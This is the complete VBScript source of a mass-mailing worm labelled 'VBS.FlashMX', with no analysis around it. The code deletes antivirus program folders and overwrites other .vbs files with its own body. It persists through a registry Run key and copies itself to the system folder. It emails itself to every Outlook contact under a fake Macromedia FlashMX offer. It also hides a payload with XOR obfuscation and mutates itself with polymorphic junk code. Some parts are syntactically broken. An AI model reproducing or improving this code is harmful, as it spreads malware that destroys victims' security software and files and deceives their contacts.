' Virus Name : VBS.FlashMX
' Author     : Dr Virus Quest
' Created    : 21st June 2002
' Origin     : Malaysia

On Error Resume Next
Set F = CreateObject("Scripting.FileSystemObject")
Set W = CreateObject("Wscript.Shell")
Set OpenSelf = F.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.Readall
Set Wfolder = F.GetSpecialFolder(0)
main()

sub main()
  Execute K("úú›´®³÷›Œòó")
  Function K(YLCG)
  For I=1 to Len(YLCG)
  K=K & Chr(Asc(Mid(YLCG,I,1)) Xor 218)
  Next
End sub

sub Anti-AV()
  If F.FolderExists("C:\Program files\Norton AntiVirus") then
    F.FolderDelete("C:\Program files\Norton AntiVirus")
  End If
  If F.FolderExists("C:\Program files\AVP") then
    F.FolderDelete("C:\Program files\AVP")
  End If
  If F.FolderExists("C:\Vbuster") then
    F.FolderDelete("C:\Vbuster")
  End If

  If Time() = "12:00:00" Then
    MsgBox "Your Macromedia Flash need to be updates! Please connected to internet for auto installation. Click OK after connected to internet.", vbOKOnly & vbExclamation, "Auto-Installation"
  End If
  Infection()
End sub

sub Infection()
For each F1 in Wfolder.Files
 ExtName = F.GetExtensionName(F1.path)
 If (ExtName="vbs") then
   Set OF = F.OpenTextFile(F1.path, 2, True)
   OF.WriteLine Self
   OF.Close
 End If
Next
Folder1 = W.SpecialFolders("AllUsersDesktop")
For Each Files1 in Folder1
 ExtName1 = F.GetExtensionName(Files1.path)
 If (ExtName1 = "vbs") then
   Set OF1 = F.OpenTextFile(Files1.path, 2, True)
   OF1.WriteLine Self
   OF1.Close
 End If
Next
Set Sysfolder = F.GetSpecialFolder(1)
F.CopyFile Wscript.ScriptFullName, Sysfolder & "\FlashMX.vbs"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Startup", Sysfolder & "\FlashMX.vbs"

If ws.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
  Outlook()
End if

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
AllCode = f.Readall
FOR o = 1 TO LEN(AllCode)
IF Mid(AllCode, o, 1) = vbCr THEN x = x + 1
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
FOR i = 1 TO (x + 1)
LineCode = f.Readline
For j = 1 To Int(Rnd * 30): JunkCode = JunkCode & Chr(255 - Int(Rnd * 200)): Next
PolyCode = PolyCode & LineCode & Chr(39) & JunkCode & vbCr
If Int(Rnd * 3) = 2 Then PolyCode = PolyCode & Chr(39) & JunkCode & vbCr
JunkCode = ""
IF LineCode = "" THEN EXIT FOR
LineCode = ""
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 2, True)
f.Writeline PolyCode
End sub

Function Outlook()
Set OutlookA = CreateObject("Outlook.Application")
If OutlookA = "Outlook" Then
  Set Mapi=OutlookA.GetNameSpace("MAPI")
  Set AddLists=Mapi.AddressLists
  For Each ListIndex In AddLists
  If ListIndex.AddressEntries.Count <> 0 Then
    ContactCountX = ListIndex.AddressEntries.Count
    For Count= 1 To ContactCountX
    Set MailX = OutlookA.CreateItem(0)
    Set ContactX = ListIndex.AddressEntries(Count)
    msgbox contactx.address
    Mailx.Recipients.Add(ContactX.Address)
    'msgbox contactx.address
    'Mailx.Recipients.Add(ContactX.Address)
    MailX.To = ContactX.Address
    MailX.Subject = "From Macromedia"
    MailX.Body = vbcrlf&"Macromedia is launching it's new product, FlashMX. And now giving out FREE copy of the FlashMX. Simply copy the file into your previous Macromedia Flash directory and run it from there."&vbcrlf
    Set Attachment=MailX.Attachments
    Attachment.Add dirsystem & "\FlashMX.vbs"
    Mailx.Attachments.Add(dirsystem & "\FlashMX.vbs")
    Mailx.Attachments.Add(dirsystem & "\FlashMX.vbs")
    Mailx.Attachments.Add("C:\WINDOWS\Start Menu\Programs\StartUp\FlashMX.vbs")
    MailX.DeleteAfterSubmit = True
    If MailX.To <> "" Then
      MailX.Send
    End If
    WS.regwrite "HKCU\software\An\mailed", "1"
    Next
End If
End Function